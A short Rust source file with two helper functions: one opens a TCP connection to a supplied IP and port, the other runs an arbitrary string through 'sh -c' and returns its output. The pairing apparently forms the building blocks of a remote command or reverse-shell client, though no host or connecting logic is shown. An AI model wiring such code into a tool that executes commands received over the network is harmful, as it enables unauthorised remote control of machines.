use std::io;
use std::net::TcpStream;
use std::process::Command;

pub fn connect_server(
    ip: String,
    port: String
    ) -> Result<TcpStream, io::Error> {

    let full_address = format!("{}:{}", ip, port);

    let stream = TcpStream::connect(full_address);
    stream
}

pub fn execute_command(cmd: &String) -> Result<String, String> {
    match Command::new("sh").arg("-c").arg(cmd).output() {
        Ok(output) => {
            if output.status.success() {
                Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
            } else {
                Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
            }
        },
        Err(e) => {
            Err(e.to_string())
        }
    }
}

